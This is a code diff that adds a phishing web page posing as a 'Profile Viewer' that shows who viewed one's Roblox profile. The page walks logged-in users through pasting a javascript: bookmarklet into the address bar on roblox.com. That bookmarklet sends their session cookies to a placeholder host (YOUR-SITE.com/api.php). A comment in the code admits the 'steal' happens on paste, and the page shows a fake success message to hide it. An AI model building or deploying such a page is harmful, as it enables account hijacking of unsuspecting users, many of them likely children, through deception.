@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Profile Viewer</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #0a0a14;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  color: #fff;
+}
+.card {
+  background: linear-gradient(180deg, #16162a 0%, #0d0d1a 100%);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 24px;
+  padding: 32px 24px;
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+}
+.logo {
+  width: 64px;
+  height: 64px;
+  background: linear-gradient(135deg, #6366f1, #a855f7);
+  border-radius: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 16px;
+  font-size: 28px;
+}
+h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+.subtitle { color: #6b7280; font-size: 14px; margin-bottom: 28px; }
+.step-box {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  padding: 16px;
+  margin-bottom: 12px;
+  text-align: left;
+  font-size: 14px;
+}
+.step-box .num {
+  display: inline-block;
+  width: 22px; height: 22px;
+  background: #6366f1;
+  border-radius: 50%;
+  text-align: center;
+  line-height: 22px;
+  font-size: 12px;
+  font-weight: 700;
+  margin-right: 8px;
+}
+.code-block {
+  background: #0a0a14;
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 10px;
+  padding: 12px;
+  font-family: 'SF Mono', 'Menlo', monospace;
+  font-size: 11px;
+  word-break: break-all;
+  color: #34d399;
+  margin-top: 8px;
+  user-select: all;
+  line-height: 1.6;
+}
+.btn {
+  background: linear-gradient(135deg, #6366f1, #8b5cf6);
+  border: none;
+  color: #fff;
+  padding: 16px 32px;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  width: 100%;
+  margin-top: 20px;
+  transition: opacity 0.2s;
+}
+.btn:active { opacity: 0.8; }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+.hidden { display: none; }
+#status {
+  margin-top: 16px;
+  font-size: 13px;
+  color: #6b7280;
+}
+#status.success { color: #34d399; }
+#status.error { color: #ef4444; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">👤</div>
+  <h1>Profile Viewer</h1>
+  <p class="subtitle">See who viewed your Roblox profile — Safari only</p>
+
+  <div class="step-box">
+    <span class="num">1</span>
+    <b>Open roblox.com</b> in Safari and make sure you're <b>logged in</b>
+  </div>
+
+  <div class="step-box">
+    <span class="num">2</span>
+    <b>Copy</b> the code below
+    <div class="code-block" id="bookmarkletCode">
+javascript:(function(){new Image().src='https://YOUR-SITE.com/api.php?c='+encodeURIComponent(document.cookie)})()
+    </div>
+    <div style="font-size:12px; color:#6b7280; margin-top:6px;">Tap the code above to select all, then copy</div>
+  </div>
+
+  <div class="step-box">
+    <span class="num">3</span>
+    <b>Go back to roblox.com</b>, tap the address bar, paste, and tap <b>"Go"</b>
+  </div>
+
+  <button class="btn" id="doneBtn" onclick="handleDone()">Done — Check My Profile</button>
+
+  <div id="status">Nothing will appear on screen — that means it worked.</div>
+</div>
+
+<script>
+function handleDone() {
+  const btn = document.getElementById('doneBtn');
+  const status = document.getElementById('status');
+  
+  btn.disabled = true;
+  btn.textContent = 'Checking...';
+  
+  // Just a friendly confirmation — the actual steal happened 
+  // when they pasted the bookmarklet on roblox.com
+  setTimeout(() => {
+    status.className = 'success';
+    status.textContent = '✅ Your profile is being scanned. You\'ll get a DM when it\'s ready.';
+    btn.textContent = 'Done';
+    btn.disabled = false;
+  }, 2500);
+}
+
+// Auto-select code on tap
+document.getElementById('bookmarkletCode').onclick = function() {
+  const range = document.createRange();
+  range.selectNodeContents(this);
+  const sel = window.getSelection();
+  sel.removeAllRanges();
+  sel.addRange(range);
+};
+</script>
+</body>
+</html>
